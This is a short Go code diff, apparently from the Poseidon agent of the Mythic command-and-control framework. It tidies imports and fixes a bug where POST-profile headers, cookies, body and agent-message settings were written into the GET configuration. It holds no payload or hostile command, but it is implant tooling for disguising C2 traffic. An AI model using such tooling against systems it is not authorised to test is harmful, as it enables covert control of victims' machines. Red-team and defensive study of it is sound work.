@@ -9,8 +9,6 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"io"
 	"math/rand"
 	"net/http"
@@ -19,6 +17,9 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 
 	// Poseidon
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
@@ -108,13 +109,13 @@ func (e *DynamicHTTPInitialConfig) parseRawC2Config(configMap map[string]interfa
 	}
 
 	if g, ok := post["ServerHeaders"]; ok {
-		getConfig.ServerHeaders = e.parseMapStringString(g.(map[string]interface{}))
+		postConfig.ServerHeaders = e.parseMapStringString(g.(map[string]interface{}))
 	}
 	if g, ok := post["ServerCookies"]; ok {
-		getConfig.ServerCookies = e.parseMapStringString(g.(map[string]interface{}))
+		postConfig.ServerCookies = e.parseMapStringString(g.(map[string]interface{}))
 	}
 	if g, ok := post["ServerBody"]; ok {
-		getConfig.ServerBody = e.parseC2DynamicHTTPFunction(g.([]interface{}))
+		postConfig.ServerBody = e.parseC2DynamicHTTPFunction(g.([]interface{}))
 	}
 	if g, ok := post["AgentMessage"]; ok {
 		agentMessages := make([]C2DynamicHTTPAgentMessage, len(g.([]interface{})))
@@ -129,7 +130,7 @@ func (e *DynamicHTTPInitialConfig) parseRawC2Config(configMap map[string]interfa
 			agentMessages[j].URLFunctions = e.parseC2DynamicHTTPModifyBlock(messageInterface["urlFunctions"].([]interface{}))
 			agentMessages[j].QueryParameters = e.parseC2DynamicHTTPModifyBlock(messageInterface["QueryParameters"].([]interface{}))
 		}
-		getConfig.AgentMessage = agentMessages
+		postConfig.AgentMessage = agentMessages
 	}
 	RawC2Config.Get = getConfig
 	RawC2Config.Post = postConfig
